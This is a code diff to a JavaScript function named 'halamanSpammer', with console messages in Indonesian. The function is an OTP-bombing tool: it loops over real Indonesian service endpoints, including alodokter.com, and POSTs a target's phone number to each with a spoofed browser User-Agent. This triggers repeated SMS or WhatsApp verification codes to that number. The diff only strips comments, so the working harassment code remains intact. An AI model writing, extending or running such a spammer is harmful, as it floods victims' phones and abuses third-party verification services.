@@ -199,7 +199,6 @@ async function halamanSpammer(user) {
     console.log(chalk.green(`✅ Target: ${phone}\n`));
     console.log(chalk.gray('⏳ Mengirim OTP... (proses ini bisa makan waktu)\n'));
 
-    // ========== DAFTAR ENDPOINT (API Key sudah di-redact) ==========
     const otp = [
         { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "REDACTED" } },
         { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
@@ -210,7 +209,6 @@ async function halamanSpammer(user) {
     ];
 
     let success = 0, failed = 0;
-    // Proses tanpa menampilkan detail endpoint
     for (let i = 0; i < otp.length; i++) {
         const ep = otp[i];
         try {
@@ -218,13 +216,12 @@ async function halamanSpammer(user) {
                 headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) },
                 timeout: 10000
             };
-            // Tampilkan indikator sederhana (tanpa endpoint)
             process.stdout.write(`[${i+1}/${otp.length}] 🔄 Mengirim... `);
             if (ep.method === "GET") await axios.get(ep.url, config);
             else await axios.post(ep.url, ep.data, config);
             success++;
             console.log(chalk.green('✅ Berhasil'));
-        } catch (e) {
+        } catch {
             failed++;
             console.log(chalk.red('❌ Gagal'));
         }
